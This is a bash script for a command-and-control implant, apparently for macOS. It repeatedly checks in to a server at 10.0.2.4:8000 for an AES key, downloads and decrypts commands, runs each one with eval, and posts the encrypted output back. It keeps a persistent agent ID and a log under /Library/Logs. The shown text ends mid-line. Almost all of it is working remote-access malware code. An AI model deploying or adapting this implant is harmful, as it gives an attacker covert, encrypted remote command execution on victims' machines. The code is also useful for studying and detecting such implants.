#!/bin/bash

LOG_DIR="/Library/Logs/c2_log"
LOG_FILE="$LOG_DIR/logfile.txt"
AGENT_ID_FILE="$LOG_DIR/agentid.txt"
SERVER_URL="http://10.0.2.4:8000"

function log_message {
    MESSAGE=$1
    mkdir -p $LOG_DIR
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    LOG_ENTRY="$TIMESTAMP - $MESSAGE"
    echo $LOG_ENTRY >> $LOG_FILE
}

function get_encryption_key {
    BASE64_KEY=$1
    log_message "Getting encryption key from Base64 string: $BASE64_KEY"

    KEY=$(echo $BASE64_KEY | base64 --decode)
    KEY_LENGTH=${#KEY}

    if [[ $KEY_LENGTH -ne 16 && $KEY_LENGTH -ne 32 ]]; then
        log_message "Invalid key size. Expected 128-bit (16 bytes) or 256-bit (32 bytes)."
        exit 1
    fi

    log_message "Encryption key obtained successfully."
    echo $KEY
}

function encrypt_data {
    DATA=$1
    KEY=$2

    log_message "Starting encryption..."
    IV=$(openssl rand -base64 16)
    ENCRYPTED_DATA=$(echo -n "$DATA" | openssl enc -aes-256-cbc -base64 -K $(echo -n "$KEY" | xxd -p -c 256) -iv $(echo -n "$IV" | xxd -p -c 256))
    log_message "Data encrypted successfully."
    echo "$IV$ENCRYPTED_DATA"
}

function decrypt_data {
    DATA=$1
    KEY=$2

    log_message "Starting decryption..."
    IV=${DATA:0:24}
    ENCRYPTED_DATA=${DATA:24}
    DECRYPTED_DATA=$(echo -n "$ENCRYPTED_DATA" | openssl enc -aes-256-cbc -d -base64 -K $(echo -n "$KEY" | xxd -p -c 256) -iv $(echo -n "$IV" | xxd -p -c 256))
    log_message "Data decrypted successfully."
    echo $DECRYPTED_DATA
}

function check_in {
    AGENT_ID=$1
    log_message "Starting check-in process..."
    RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AgentID": "'"$AGENT_ID"'"}' "$SERVER_URL/checkin")
    BASE64_KEY=$(echo $RESPONSE | jq -r .key)
    log_message "Received Base64Key: $BASE64_KEY"
    KEY=$(get_encryption_key $BASE64_KEY)
    log_message "Encryption key obtained."
    echo $KEY
}

function send_result {
    AGENT_ID=$1
    RESULT=$2
    KEY=$3

    log_message "Encrypting result..."
    ENCRYPTED_RESULT=$(encrypt_data "$RESULT" "$KEY")
    RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AgentID": "'"$AGENT_ID"'", "Result": "'"$ENCRYPTED_RESULT"'"}' "$SERVER_URL/result")
    log_message "Result sent successfully: $RESPONSE"
}

function execute_command {
    AGENT_ID=$1
    KEY=$2
    COMMAND=$3

    log_message "Decrypting command..."
    DECRYPTED_COMMAND=$(decrypt_data "$COMMAND" "$KEY")
    log_message "Decrypted Command: $DECRYPTED_COMMAND"
    if [[ $DECRYPTED_COMMAND != "NoCommand" ]]; then
        log_message "Executing command: $DECRYPTED_COMMAND"
        RESULT=$(eval $DECRYPTED_COMMAND)
        log_message "Command execution result: $RESULT"
        log_message "Sending result..."
        send_result "$AGENT_ID" "$RESULT" "$KEY"
    else
        log_message "No commands to execute."
    fi
}

function main_loop {
    while true; do
        KEY=$(check_in "$AGENT_ID")
        COMMAND=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AgentID": "'"$AGENT_ID"'"}' "$SERVER_URL/command")
        execute_command "$AGENT_ID" "$KEY" "$COMMAND"
        sleep 10
    done
}

if [[ ! -d $LOG_DIR ]]; then
    mkdir -p $LOG_DIR
fi

if [[ ! -f $AGENT_ID_FILE ]]; then
    AGENT_ID=$(uuidgen)
    echo $AGENT_ID > $AGENT_ID_FILE
else
    AGENT_ID=$(cat $AGENT_ID_FILE)
fi

log_message "Using
